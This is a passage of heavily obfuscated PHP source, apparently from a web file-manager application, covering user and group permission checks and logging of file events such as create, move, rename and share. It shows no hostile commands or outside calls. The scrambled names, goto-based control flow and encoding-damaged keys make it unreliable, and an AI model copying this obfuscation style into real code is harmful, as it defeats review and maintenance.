Model($b½ëÒæÊÇ™[480])->getInfo($d²ˆ¬¶ë‚); return array($b½ëÒæÊÇ™[1862] => intval($C¸£äÛ·è‚[$b½ëÒæÊÇ™[400]]), $b½ëÒæÊÇ™[1846] => $C¸£äÛ·è‚, $b½ëÒæÊÇ™[1863] => LNG($b½ëÒæÊÇ™[1864]), $b½ëÒæÊÇ™[1855] => array($b½ëÒæÊÇ™[407] => $cØ•á˜Ë[$b½ëÒæÊÇ™[28]], $b½ëÒæÊÇ™[75] => KodIO::make($cØ•á˜Ë[$b½ëÒæÊÇ™[84]][$b½ëÒæÊÇ™[390]]), $b½ëÒæÊÇ™[1861] => $cØ•á˜Ë[$b½ëÒæÊÇ™[485]])); } protected function groupRootAuth($cË¦ï¼ÔÌœ, $dá¼ÚÉˆ¼• = false) { goto CĞ©Âùªà‚; d±¨æåİÉ: static $aÜŒ·á§„ = array(); if (isset($aÜŒ·á§„[$bÑæğƒ´æõ])) { return $aÜŒ·á§„[$bÑæğƒ´æõ]; } $AÚ©àÀÚë = Model($EÈåœİ…ˆ¡[480])->getInfo($cË¦ï¼ÔÌœ); goto BÏ­ÜÅ‰‹ù; cØÀÏ†×Õ§: $C…±·Í° = $this->sourceAuthSelect($AÚ©àÀÚë[$EÈåœİ…ˆ¡[84]][$EÈåœİ…ˆ¡[390]]); $fÅ¥ÜƒÔ½º = $C…±·Í° ? $this->authMake($C…±·Í°, $dá¼ÚÉˆ¼•) : !1; $d‡‡µ÷Çœà = $fÅ¥ÜƒÔ½º ? $fÅ¥ÜƒÔ½º[$EÈåœİ…ˆ¡[440]] : !1; goto F¶©µ²Éõ; F¶©µ²Éõ: $aÜŒ·á§„[$bÑæğƒ´æõ] = $d‡‡µ÷Çœà ? $d‡‡µ÷Çœà : $cŞá¢ù‹ˆ¦; return $aÜŒ·á§„[$bÑæğƒ´æõ]; goto bì’çé™•; CĞ©Âùªà‚: $EÈåœİ…ˆ¡ =& $_SERVER[µ…]; $dá¼ÚÉˆ¼• = $dá¼ÚÉˆ¼• ? $dá¼ÚÉˆ¼• : USER_ID; $bÑæğƒ´æõ = $dá¼ÚÉˆ¼• . $EÈåœİ…ˆ¡[1865] . $cË¦ï¼ÔÌœ; goto d±¨æåİÉ; BÏ­ÜÅ‰‹ù: $bì¸ö«¸—µ = $this->userGroupList($dá¼ÚÉˆ¼•); $cŞá¢ù‹ˆ¦ = isset($bì¸ö«¸—µ[$cË¦ï¼ÔÌœ]) ? $bì¸ö«¸—µ[$cË¦ï¼ÔÌœ][$EÈåœİ…ˆ¡[400]] : !1; if ($cŞá¢ù‹ˆ¦ && Model($EÈåœİ…ˆ¡[1837])->authCheckAction($cŞá¢ù‹ˆ¦[$EÈåœİ…ˆ¡[400]], $EÈåœİ…ˆ¡[1689])) { $aÜŒ·á§„[$bÑæğƒ´æõ] = $cŞá¢ù‹ˆ¦; return $cŞá¢ù‹ˆ¦; } goto cØÀÏ†×Õ§; bì’çé™•: } public function authOwnerApply($F…œ¢İ¢•í) { goto c¢ÅÎÍí±™; BÛ‰‰¸÷’: $F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[400]][$f·ƒ‰‹ˆŒ[1868]] = Model($f·ƒ‰‹ˆŒ[497])->userListInfo($BÛ†æš§ï); return $F…œ¢İ¢•í; goto eøæ¬¿øÏ; e´±¿¼ÅÁ: $f¿¤®»Õ÷³ = Model($f·ƒ‰‹ˆŒ[1181])->parentLevelArray($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[481]]); $f¿¤®»Õ÷³ = array_merge(array($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[390]]), array_reverse($f¿¤®»Õ÷³)); $CéŠ—±Ó»º = $this->sourceAuthSelect($f¿¤®»Õ÷³); goto FÍªÙì›Æ±; c¢ÅÎÍí±™: $f·ƒ‰‹ˆŒ =& $_SERVER[µ…]; if (empty($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[400]]) || isset($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[1866]]) && $F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[1866]]) { return $F…œ¢İ¢•í; } if (AuthModel::authCheckRoot($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[400]][$f·ƒ‰‹ˆŒ[401]])) { return $F…œ¢İ¢•í; } goto e´±¿¼ÅÁ; FÍªÙì›Æ±: $cŞçÁ’¿£ƒ = array(); $BÛ†æš§ï = array(); foreach ($CéŠ—±Ó»º as $Fæö‡ç¨¨ => $cÏ„«°‹ÈÑ) { $E´É¶ÅŒ× = $this->authFolderOwnerUser($cÏ„«°‹ÈÑ); $cŞçÁ’¿£ƒ[$Fæö‡ç¨¨] = $E´É¶ÅŒ×; $BÛ†æš§ï = array_merge($BÛ†æš§ï, $E´É¶ÅŒ×[$f·ƒ‰‹ˆŒ[557]]); if ($E´É¶ÅŒ×[$f·ƒ‰‹ˆŒ[1867]]) { break; } } goto fë‹´©¬Ò†; fë‹´©¬Ò†: if (count($BÛ†æš§ï) == 0) { $BÛ†æš§ï = $this->authFolderOwnerGroup($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[478]]); } $BÛ†æš§ï = array_unique($BÛ†æš§ï); if (AuthModel::authCheckRoot($F…œ¢İ¢•í[$f·ƒ‰‹ˆŒ[400]][$f·ƒ‰‹ˆŒ[401]])) { $BÛ†æš§ï[] = USER_ID; } goto BÛ‰‰¸÷’; eøæ¬¿øÏ: } private function authFolderOwnerGroup($Dºµ¢‘‡È›) { $Bà„ˆÔœ… =& $_SERVER[µ…]; $AÄ„×Ì‘ßƒ = Model($Bà„ˆÔœ…[1751])->where(array($Bà„ˆÔœ…[1669] => $Dºµ¢‘‡È›))->select(); $f¥¸Å°œÌæ = array(); if (!$AÄ„×Ì‘ßƒ) { return $f¥¸Å°œÌæ; } foreach ($AÄ„×Ì‘ßƒ as $eŞöƒƒí) { $f±»®£â÷ = $this->authInfo($eŞöƒƒí); if (AuthModel::authCheckRoot($f±»®£â÷[$Bà„ˆÔœ…[400]])) { $f¥¸Å°œÌæ[] = $eŞöƒƒí[$Bà„ˆÔœ…[1506]]; } } return $f¥¸Å°œÌæ; } private function authFolderOwnerUser($bŞ—˜‚ÈÓÌ) { $E³º•È¬¨ =& $_SERVER[µ…]; $C¼¶šÀŒÔ = array(); $FÏ–½¤­š¤ = !1; foreach ($bŞ—˜‚ÈÓÌ as $b±ªë­ë´…) { $a¥’´×Çì = $this->authInfo($b±ªë­ë´…); if ($b±ªë­ë´…[$E³º•È¬¨[478]] == $E³º•È¬¨[491]) { $FÏ–½¤­š¤ = !0; } if ($b±ªë­ë´…[$E³º•È¬¨[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a¥’´×Çì[$E³º•È¬¨[400]])) { $C¼¶šÀŒÔ[] = $b±ªë­ë´…[$E³º•È¬¨[478]]; } } } return array($E³º•È¬¨[557] => $C¼¶šÀŒÔ, $E³º•È¬¨[1867] => $FÏ–½¤­š¤); } public function authMake($d…¡ç‹Æ˜Ô, $F…É¦…Šó = false) { $a‘×ÍóÅŸ =& $_SERVER[µ…]; $FšÜÑìÆµ£ = $this->authArrayCheck($d…¡ç‹Æ˜Ô, $F…É¦…Šó); if ($FšÜÑìÆµ£[$a‘×ÍóÅŸ[1869]]) { $FšÜÑìÆµ£[$a‘×ÍóÅŸ[1869]] = $this->sourceAuthInfo($FšÜÑìÆµ£[$a‘×ÍóÅŸ[1869]]); } return $FšÜÑìÆµ£; } public function authArrayCheck($fë¬«ë·Ş, $E¾¿›Ã¤Î = false) { goto cÌÆˆÀ­; FîæñÙ‘Œ­: $eá‹âÚÌ = 0; $C·…éçÆ = 0; $a©ÙêÈÌ±Ã = 0; goto e¨ñõó·‘Ñ; aÓíË§½…©: foreach ($fë¬«ë·Ş as $fèîÊ‡¸Ë‚) { $dĞæ™‡…ÖÜ = $this->authInfo($fèîÊ‡¸Ë‚); if (!$dĞæ™‡…ÖÜ) { continue; } $E‚·§À£ÜÑ = $fèîÊ‡¸Ë‚[$dàÆ›¹‚Í[478]]; $eŠ’›²âÌÌ = intval($dĞæ™‡…ÖÜ[$dàÆ›¹‚Í[400]]); if ($fèîÊ‡¸Ë‚[$dàÆ›¹‚Í[398]] == SourceModel::TYPE_USER && $E‚·§À£ÜÑ == $E¾¿›Ã¤Î) { $cô™–õŠğŒ = !0; $b­Òƒ¥’–š = $dĞæ™‡…ÖÜ; $e¦Ÿ¶š‡ìä = $eŠ’›²âÌÌ; } else { if ($fèîÊ‡¸Ë‚[$dàÆ›¹‚Í[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($E‚·§À£ÜÑ, $E¾¿›Ã¤Î)) { $eá‹âÚÌ = !0; $BÍŒ–»ôä = $this->groupStepToUserGroup($E‚·§À£ÜÑ, $E¾¿›Ã¤Î); if ($BÍŒ–»ôä < $F­–«İ©æŒ) { $F­–«İ©æŒ = $BÍŒ–»ôä; $C·…éçÆ = $eŠ’›²âÌÌ; $a©ÙêÈÌ±Ã = $dĞæ™‡…ÖÜ; $CÛõ”›ĞÏ´ = $E‚·§À£ÜÑ; } if ($BÍŒ–»ôä == $F­–«İ©æŒ && $eŠ’›²âÌÌ >= $C·…éçÆ) { $C·…éçÆ = $eŠ’›²âÌÌ; $a©ÙêÈÌ±Ã = $dĞæ™‡…ÖÜ; $CÛõ”›ĞÏ´ = $E‚·§À£ÜÑ; } } else { if ($E‚·§À£ÜÑ == $dàÆ›¹‚Í[491]) { $B½…óõéƒß = !0; $B„Ïğ£„Ÿ = $dĞæ™‡…ÖÜ; $aéÜ‰œ‚ÙÄ = $eŠ’›²âÌÌ; } } } } if ($cô™–õŠğŒ) { $A¤‡¨ÚéÑÛ = $e¦Ÿ¶š‡ìä; $dĞæ™‡…ÖÜ = $b­Òƒ¥’–š; $B²„¸«’ì = LNG($dàÆ›¹‚Í[1870]); } else { if ($eá‹âÚÌ) { $A¤‡¨ÚéÑÛ = $C·…éçÆ; $dĞæ™‡…ÖÜ = $a©ÙêÈÌ±Ã; $Cœ»ãËù¼ = Model($dàÆ›¹‚Í[480])->getInfo($CÛõ”›ĞÏ´); $B²„¸«’ì = $dàÆ›¹‚Í[159] . $Cœ»ãËù¼[$dàÆ›¹‚Í[485]] . $dàÆ›¹‚Í[1871] . LNG($dàÆ›¹‚Í[1872]); } else { if ($B½…óõéƒß) { $A¤‡¨ÚéÑÛ = $aéÜ‰œ‚ÙÄ; $dĞæ™‡…ÖÜ = $B„Ïğ£„Ÿ; $B²„¸«’ì = LNG($dàÆ›¹‚Í[1843]); } else { $A¤‡¨ÚéÑÛ = 0; $dĞæ™‡…ÖÜ = !1; $B²„¸«’ì = $dàÆ›¹‚Í[33]; } } } $B£¡Š™×œØ = array($dàÆ›¹‚Í[1862] => intval($A¤‡¨ÚéÑÛ), $dàÆ›¹‚Í[1846] => $dĞæ™‡…ÖÜ, $dàÆ›¹‚Í[1863] => $B²„¸«’ì, $dàÆ›¹‚Í[1855] => $fèîÊ‡¸Ë‚[$dàÆ›¹‚Í[390]]); goto DÈÏ±ß‚ÉÏ; D¨˜¡Ÿø±: $aéÜ‰œ‚ÙÄ = 0; $B„Ïğ£„Ÿ = 0; $fèîÊ‡¸Ë‚ = array($dàÆ›¹‚Í[390] => 0); goto aÓíË§½…©; cÌÆˆÀ­: $dàÆ›¹‚Í =& $_SERVER[µ…]; if (!$fë¬«ë·Ş) { return array($dàÆ›¹‚Í[401] => 0, $dàÆ›¹‚Í[440] => !1); } $E¾¿›Ã¤Î = $E¾¿›Ã¤Î ? $E¾¿›Ã¤Î : USER_ID; goto Bª»ñÂª‹…; Bª»ñÂª‹…: $cô™–õŠğŒ = 0; $e¦Ÿ¶š‡ìä = 0; $b­Òƒ¥’–š = 0; goto FîæñÙ‘Œ­; DÈÏ±ß‚ÉÏ: return $B£¡Š™×œØ; goto a¦¢ÉËŸ«­; e¨ñõó·‘Ñ: $F­–«İ©æŒ = 1000; $CÛõ”›ĞÏ´ = 0; $B½…óõéƒß = 0; goto D¨˜¡Ÿø±; a¦¢ÉËŸ«­: } private function groupContainUser($AÙ†ˆ‚”’, $Fó©ñ’Ìˆ” = false) { return in_array($AÙ†ˆ‚”’, $this->userGroupParents($Fó©ñ’Ìˆ”)); } private function groupStepToUserGroup($eÉÙË‡èËÇ, $f‰ĞÂµò¦½ = false) { goto còˆ·â™„; F¶ŞñŞƒ—: return $CŒÙÅ†ª¢; goto cÊ”ŠìëñŒ; còˆ·â™„: $bœˆíÒöµ =& $_SERVER[µ…]; $eàÃŞÓñçğ = $this->userGroupList($f‰ĞÂµò¦½); $CŒÙÅ†ª¢ = 1000; goto B‡Ü¹İ´Â; B‡Ü¹İ´Â: $b‹¿ïğÏ°É = $GLOBALS[$bœˆíÒöµ[6]][$bœˆíÒöµ[87]][$bœˆíÒöµ[1762]] == 1; $Dé·×ƒÉ´Ù = $b‹¿ïğÏ°É ? 3 : 2; foreach ($eàÃŞÓñçğ as $f¶’îÀì‡Ç) { if ($f¶’îÀì‡Ç[$bœˆíÒöµ[1669]] == $eÉÙË‡èËÇ) { return 0; } $DñÚ”À„½¯ = explode($bœˆíÒöµ[47], trim($f¶’îÀì‡Ç[$bœˆíÒöµ[481]], $bœˆíÒöµ[47])); if ($DñÚ”À„½¯[0] == $bœˆíÒöµ[491] && count($DñÚ”À„½¯) > $Dé·×ƒÉ´Ù) { $Aà”‡©¾¯ƒ = array_reverse(array_slice($DñÚ”À„½¯, $Dé·×ƒÉ´Ù)); $bÆ§Ù†Œ¬ = array_search($eÉÙË‡èËÇ, $Aà”‡©¾¯ƒ); if ($bÆ§Ù†Œ¬ !== !1 && $bÆ§Ù†Œ¬ + 1 <= $CŒÙÅ†ª¢) { $CŒÙÅ†ª¢ = $bÆ§Ù†Œ¬ + 1; } } } goto F¶ŞñŞƒ—; cÊ”ŠìëñŒ: } private function userGroupList($a†å‘Êª“¥ = false) { $FÕİ¾½Õ =& $_SERVER[µ…]; static $C‘Š–Õ‡‡‡ = array(); if (isset($C‘Š–Õ‡‡‡[$a†å‘Êª“¥])) { return $C‘Š–Õ‡‡‡[$a†å‘Êª“¥]; } $BÅÚŒ®ğÄ = Model($FÕİ¾½Õ[501])->getInfo($a†å‘Êª“¥); $C‘Š–Õ‡‡‡[$a†å‘Êª“¥] = array_to_keyvalue($BÅÚŒ®ğÄ[$FÕİ¾½Õ[1844]], $FÕİ¾½Õ[1669]); return $C‘Š–Õ‡‡‡[$a†å‘Êª“¥]; } public function userGroupParents($BØ¬¸ÌÂá•) { goto Fì¤Èèíœ·; Fì¤Èèíœ·: $B‡À§êß¥ =& $_SERVER[µ…]; static $B™ĞÇ‹Ô× = array(); $BØ¬¸ÌÂá• = $BØ¬¸ÌÂá• ? $BØ¬¸ÌÂá• : USER_ID; goto F›ïšˆ¯Ó…; F›ïšˆ¯Ó…: if (isset($B™ĞÇ‹Ô×[$BØ¬¸ÌÂá•])) { return $B™ĞÇ‹Ô×[$BØ¬¸ÌÂá•]; } $a¦÷‚¿Âõ½ = $this->userGroupList($BØ¬¸ÌÂá•); $aé©“§à‹Ó = array(); goto C¶ÇÁªÛÍÃ; C¶ÇÁªÛÍÃ: $CŠïÃ‘æŞÌ = $GLOBALS[$B‡À§êß¥[6]][$B‡À§êß¥[87]][$B‡À§êß¥[1762]] == 1; $AÀ³Ã»å¹ = $CŠïÃ‘æŞÌ ? 3 : 2; foreach ($a¦÷‚¿Âõ½ as $FòİÕñéá©) { $d‘İ–«÷ = array($FòİÕñéá©[$B‡À§êß¥[1669]]); $B²•¡ÓãÕ = explode($B‡À§êß¥[47], trim($FòİÕñéá©[$B‡À§êß¥[481]], $B‡À§êß¥[47])); if ($B²•¡ÓãÕ[0] == $B‡À§êß¥[491] && count($B²•¡ÓãÕ) > $AÀ³Ã»å¹) { $c‚ Ï—ê¢ = array_slice($B²•¡ÓãÕ, $AÀ³Ã»å¹); $d‘İ–«÷ = array_merge($d‘İ–«÷, array_reverse($c‚ Ï—ê¢)); } $aé©“§à‹Ó = array_merge($aé©“§à‹Ó, $d‘İ–«÷); } goto E‘‹ï·à¹; E‘‹ï·à¹: $B™ĞÇ‹Ô×[$BØ¬¸ÌÂá•] = array_unique($aé©“§à‹Ó); return $B™ĞÇ‹Ô×[$BØ¬¸ÌÂá•]; goto FÁ“Ïé„ä; FÁ“Ïé„ä: } public function authTargetInfoMake($A»–í¬×È) { goto F„à´¦Òò; F„à´¦Òò: $E²¿ˆºîÔè =& $_SERVER[µ…]; $dÜÔê¹Ìë = array(); $f¶ËÊèéø¢ = array(); goto A„¦¬•¦Ê£; A„¦¬•¦Ê£: foreach ($A»–í¬×È as $cïØŒÆ»†) { if ($cïØŒÆ»†[$E²¿ˆºîÔè[398]] == SourceModel::TYPE_USER) { $dÜÔê¹Ìë[] = intval($cïØŒÆ»†[$E²¿ˆºîÔè[478]]); } else { if ($cïØŒÆ»†[$E²¿ˆºîÔè[398]] == SourceModel::TYPE_GROUP) { $f¶ËÊèéø¢[] = intval($cïØŒÆ»†[$E²¿ˆºîÔè[478]]); } } } if ($dÜÔê¹Ìë) { $dÜÔê¹Ìë = Model($E²¿ˆºîÔè[497])->userListInfo($dÜÔê¹Ìë); } if ($f¶ËÊèéø¢) { $FÏíé¼”¥® = array($E²¿ˆºîÔè[1748] => array($E²¿ˆºîÔè[405], $f¶ËÊèéø¢)); $f¶ËÊèéø¢ = Model($E²¿ˆºîÔè[480])->field($E²¿ˆºîÔè[1873])->where($FÏíé¼”¥®)->select(); $f¶ËÊèéø¢ = array_to_keyvalue($f¶ËÊèéø¢, $E²¿ˆºîÔè[1669]); } goto B³È”˜ê®Û; B³È”˜ê®Û: return array($E²¿ˆºîÔè[1874] => $dÜÔê¹Ìë, $E²¿ˆºîÔè[1875] => $f¶ËÊèéø¢); goto fâšÂ«Ëˆ; fâšÂ«Ëˆ: } public function authInfo($BñÃ…ÃŒò¸) { $c‡¬ÖÉ†ŠÜ =& $_SERVER[µ…]; if ($BñÃ…ÃŒò¸[$c‡¬ÖÉ†ŠÜ[1765]]) { $bë›¾ˆ‘ÇŠ = Model($c‡¬ÖÉ†ŠÜ[1837])->listData($BñÃ…ÃŒò¸[$c‡¬ÖÉ†ŠÜ[1765]]); if (!$bë›¾ˆ‘ÇŠ) { return !1; $f•È‡µŞ“® = Model($c‡¬ÖÉ†ŠÜ[1837])->listData(); $CÔÂë¥ÄŠ = array_filter_by_field($f•È‡µŞ“®, $c‡¬ÖÉ†ŠÜ[400], $c‡¬ÖÉ†ŠÜ[491]); return $CÔÂë¥ÄŠ; } $a§©‹¡î—… = array_field_key($bë›¾ˆ‘ÇŠ, array($c‡¬ÖÉ†ŠÜ[388], $c‡¬ÖÉ†ŠÜ[28], $c‡¬ÖÉ†ŠÜ[400], $c‡¬ÖÉ†ŠÜ[1690], $c‡¬ÖÉ†ŠÜ[1692])); $a§©‹¡î—…[$c‡¬ÖÉ†ŠÜ[1876]] = $BñÃ…ÃŒò¸; return $a§©‹¡î—…; } else { return array($c‡¬ÖÉ†ŠÜ[406] => 0, $c‡¬ÖÉ†ŠÜ[1675] => $BñÃ…ÃŒò¸[$c‡¬ÖÉ†ŠÜ[1819]], $c‡¬ÖÉ†ŠÜ[407] => $c‡¬ÖÉ†ŠÜ[33], $c‡¬ÖÉ†ŠÜ[1690] => $c‡¬ÖÉ†ŠÜ[1877]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\162\143\145\x5f\145\x76\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\151\155\145", "\x74\151\x6d\x65", "\151\x6e\163\145\x72\164", "\x66\165\156\143\164\151\157\156"), array("\x64\145\x73\x63", '', "\x69\x6e\x73\x65\x72\x74\54\x75\160\x64\x61\164\x65\x2c\163\145\x6c\x65\143\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($a¦¥ò‡ØÁì, $Fè„ëÍ¢, $aÊ®à®Ä„ = '') { goto a¶¬ßïš; D˜˜ƒ§ŒÇ: if (!$f„ÒªŠ) { return !1; } if ($this->isCacheEvent($f„ÒªŠ, $Fè„ëÍ¢)) { return; } if ($aÊ®à®Ä„ && is_string($aÊ®à®Ä„)) { $aÊ®à®Ä„ = array($Dòâ“¢Áİ›[1702] => $aÊ®à®Ä„); } goto bÁ™ˆ÷ˆ„Ü; a¶¬ßïš: $Dòâ“¢Áİ› =& $_SERVER[µ…]; if (!$this->eventSave) { return; } $f„ÒªŠ = Model($Dòâ“¢Áİ›[1181])->sourceInfo($a¦¥ò‡ØÁì); goto D˜˜ƒ§ŒÇ; bÁ™ˆ÷ˆ„Ü: $A„ŞëõÙ¯¦ = array($Dòâ“¢Áİ›[404] => $a¦¥ò‡ØÁì, $Dòâ“¢Áİ›[1878] => $f„ÒªŠ[$Dòâ“¢Áİ›[472]], $Dòâ“¢Áİ›[1879] => $f„ÒªŠ[$Dòâ“¢Áİ›[28]], $Dòâ“¢Áİ›[489] => $f„ÒªŠ[$Dòâ“¢Áİ›[489]], $Dòâ“¢Áİ›[1498] => USER_ID, $Dòâ“¢Áİ›[409] => $Fè„ëÍ¢, $Dòâ“¢Áİ›[1500] => $aÊ®à®Ä„); $this->addSystemLog($Fè„ëÍ¢, $A„ŞëõÙ¯¦); return $this->add($A„ŞëõÙ¯¦); goto AŠƒ¼ªºì‹; AŠƒ¼ªºì‹: } private function addSystemLog($FŸºã±ù´Ã, $fÖ‘Ë×•Ü…) { $FŠĞ’«íš÷ =& $_SERVER[µ…]; if ($FŸºã±ù´Ã == $FŠĞ’«íš÷[1880]) { $FŸºã±ù´Ã = $fÖ‘Ë×•Ü…[$FŠĞ’«íš÷[425]][$FŠĞ’«íš÷[1881]]; } else { if (in_array($FŸºã±ù´Ã, array($FŠĞ’«íš÷[1646], $FŠĞ’«íš÷[1882]))) { $FŸºã±ù´Ã = $fÖ‘Ë×•Ü…[$FŠĞ’«íš÷[425]][$FŠĞ’«íš÷[707]]; } } $Cë’×ğŸ•ê = array_merge($fÖ‘Ë×•Ü…, array($FŠĞ’«íš÷[1883] => $fÖ‘Ë×•Ü…[$FŠĞ’«íš÷[390]], $FŠĞ’«íš÷[1884] => $fÖ‘Ë×•Ü…[$FŠĞ’«íš÷[1884]])); Model($FŠĞ’«íš÷[1610])->addLog($FŠĞ’«íš÷[1885] . $FŸºã±ù´Ã, $Cë’×ğŸ•ê); } private function isCacheEvent($c”Í‹Šíó¢, $e×ï³˜éÉ) { if ($c”Í‹Šíó¢[$_SERVER[µ…][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aÕ¿ªÀöĞ¯, $c’Ñâ¦ÛŒ’) { $c²ŠÌëÍ›´ =& $_SERVER[µ…]; $F±à—‡×” = Model($c²ŠÌëÍ›´[1181])->sourceInfo($aÕ¿ªÀöĞ¯); $c·åà×¹Ï¾ = array($c²ŠÌëÍ›´[1881] => $c’Ñâ¦ÛŒ’, $c²ŠÌëÍ›´[28] => $F±à—‡×”[$c²ŠÌëÍ›´[28]]); return $this->addEvent($aÕ¿ªÀöĞ¯, $c²ŠÌëÍ›´[1880], $c·åà×¹Ï¾); } public function eventFileEdit($aÌÉÜå¼éé) { $eßª ğ¨Û =& $_SERVER[µ…]; $DÊ¦å—£ = array($eßª ğ¨Û[1886] => $_SERVER[$eßª ğ¨Û[1887]], $eßª ğ¨Û[1888] => strtolower(ACTION)); return $this->addEvent($aÌÉÜå¼éé, $eßª ğ¨Û[1636], $DÊ¦å—£); } public function eventRecycle($F®ŸŒÜòñ, $cƒ½ËÃƒ¤) { return $this->addEvent($F®ŸŒÜòñ, $_SERVER[µ…][1882], $cƒ½ËÃƒ¤); } public function eventRemove($a¨é–‘Øêô) { $D­ºâï÷ŸÒ =& $_SERVER[µ…]; $Aè“ğÓğíŸ = Model($D­ºâï÷ŸÒ[1181])->sourceInfo($a¨é–‘Øêô); $Fµ­†éç¬ = $Aè“ğÓğíŸ[$D­ºâï÷ŸÒ[28]]; return $this->addEvent($Aè“ğÓğíŸ[$D­ºâï÷ŸÒ[472]], $D­ºâï÷ŸÒ[1635], $Fµ­†éç¬); } public function eventShare($e‰ˆ±——ƒÊ, $C³§÷Š¹ˆ) { return $this->addEvent($e‰ˆ±——ƒÊ, $_SERVER[µ…][1646], $C³§÷Š¹ˆ); } public function eventMove($C¹„ğÊ÷, $B›¢ë¾æŞ¬, $FùÒ›ˆŒà¯) { goto BáÚÅ¤åËà; eÛŒí¡ÇÙŒ: $this->addEvent($C¹„ğÊ÷, $a·ğªë‘ò¿[515], $dÛÌ®‘ŸŒÔ); $C×ùí’Â… = $eÊ’åË–‰é->sourceInfo($C¹„ğÊ÷); $dÛÌ®‘ŸŒÔ = array($a·ğªë‘ò¿[390] => $C×ùí’Â…[$a·ğªë‘ò¿[390]], $a·ğªë‘ò¿[28] => $C×ùí’Â…[$a·ğªë‘ò¿[28]]); goto D§¹±™™²Ç; BáÚÅ¤åËà: $a·ğªë‘ò¿ =& $_SERVER[µ…]; $eÊ’åË–‰é = Model($a·ğªë‘ò¿[1181]); $C×ùí’Â… = $eÊ’åË–‰é->sourceInfo($C¹„ğÊ÷); goto A»ƒ´‰†é; A»ƒ´‰†é: $dì¼¦‹ØùÅ = $eÊ’åË–‰é->sourceInfo($B›¢ë¾æŞ¬); $DÏ‹©¾ÕÂÇ = $eÊ’åË–‰é->sourceInfo($FùÒ›ˆŒà¯); $dÛÌ®‘ŸŒÔ = array($a·ğªë‘ò¿[1032] => $B›¢ë¾æŞ¬, $a·ğªë‘ò¿[1889] => $dì¼¦‹ØùÅ[$a·ğªë‘ò¿[28]], $a·ğªë‘ò¿[1869] => $dì¼¦‹ØùÅ[$a·ğªë‘ò¿[489]], $a·ğªë‘ò¿[1033] => $FùÒ›ˆŒà¯, $a·ğªë‘ò¿[1890] => $DÏ‹©¾ÕÂÇ[$a·ğªë‘ò¿[28]], $a·ğªë‘ò¿[1891] => $DÏ‹©¾ÕÂÇ[$a·ğªë‘ò¿[489]]); goto eÛŒí¡ÇÙŒ; D§¹±™™²Ç: $this->addEvent($B›¢ë¾æŞ¬, $a·ğªë‘ò¿[1892], $dÛÌ®‘ŸŒÔ); goto f´ÅŠ»î’Ã; f´ÅŠ»î’Ã: } public function eventCopy($E¨©‡îäšÖ) { $this->eventCreate($E¨©‡îäšÖ, $_SERVER[µ…][513]); } public function eventRename($CÇçˆ«Œ†, $AŠÂ¢·‘ò, $AˆÅ¦³‰®) { $Eò³ÎƒóÇ× =& $_SERVER[µ…]; $CÚ­÷Š¼çÙ = array($Eò³ÎƒóÇ×[1032] => $AŠÂ¢·‘ò, $Eò³ÎƒóÇ×[1033] => $AˆÅ¦³‰®); return $this->addEvent($CÇçˆ«Œ†, $Eò³ÎƒóÇ×[1196], $CÚ­÷Š¼çÙ); } public function eventAddComment($A§‹ÂùÄï´, $e‘¼ãâ‹±à) { return $this->addEvent($A§‹ÂùÄï´, $_SERVER[µ…][1893], $e‘¼ãâ‹±à); } public function eventAddDesc($AØ»¨ÖÇ››, $F÷‹Ó÷ìØô) { return $this->addEvent($AØ»¨ÖÇ››, $_SERVER[µ…][1894], $F÷‹Ó÷ìØô); } public function listBySource($AğÏ¬›õŠ) { goto bÜáµÁİóè; b©½¨¼¡È: return $this->eventListParse($B«³¼¢ì·¤, $AğÏ¬›õŠ); goto aŒÙîâº¢ò; bÜáµÁİóè: $bêŒ£Ÿğ =& $_SERVER[µ…]; $eÏâ«ã‡¸ = Model($bêŒ£Ÿğ[1181])->sourceInfo($AğÏ¬›õŠ); $F»éâ÷¤í± = array($bêŒ£Ÿğ[404] => $AğÏ¬›õŠ); goto a–¨ƒ÷ø·Ö; a–¨ƒ÷ø·Ö: if ($eÏâ«ã‡¸[$bêŒ£Ÿğ[397]] == $bêŒ£Ÿğ[86]) { $fîØË˜‘ = Model($bêŒ£Ÿğ[1181])->listSearchChildren($AğÏ¬›õŠ, 20000); $fîØË˜‘[] = $AğÏ¬›õŠ . $bêŒ£Ÿğ[373]; $F»éâ÷¤í± = array($bêŒ£Ÿğ[390] => array($bêŒ£Ÿğ[7], $fîØË˜‘)); } $B«³¼¢ì·¤ = $this->where($F»éâ÷¤í±)->order($bêŒ£Ÿğ[1895])->selectPage(); if ($B«³¼¢ì·¤[$bêŒ£Ÿğ[362]][$bêŒ£Ÿğ[363]] == 0) { $B«³¼¢ì·¤[$bêŒ£Ÿğ[362]][$bêŒ£Ÿğ[363]] = 1; $B«³¼¢ì·¤[$bêŒ£Ÿğ[365]] = array(array($bêŒ£Ÿğ[404] => $AğÏ¬›õŠ, $bêŒ£Ÿğ[1878] => $eÏâ«ã‡¸[$bêŒ£Ÿğ[472]], $bêŒ£Ÿğ[1498] => $eÏâ«ã‡¸[$bêŒ£Ÿğ[426]], $bêŒ£Ÿğ[409] => $bêŒ£Ÿğ[1896], $bêŒ£Ÿğ[410] => $eÏâ«ã‡¸[$bêŒ£Ÿğ[192]], $bêŒ£Ÿğ[1500] => $bêŒ£Ÿğ[33])); } goto b©½¨¼¡È; aŒÙîâº¢ò: } private function eventListParse($e¿¸¾š¢Á†, $D¼õéÆ«Ïø) { goto eƒØïğÔÍò; dîî¯Ïè¬§: $FŸñºÌ½ = Model($aÚ÷¡Í»‰Ï[769])->sourceListInfo($eùˆœÔÄœ½, !0); foreach ($eå“©ˆö‚ø as &$dêôó×î°¬) { if ($dêôó×î°¬[$aÚ÷¡Í»‰Ï[29]] == $aÚ÷¡Í»‰Ï[515] && 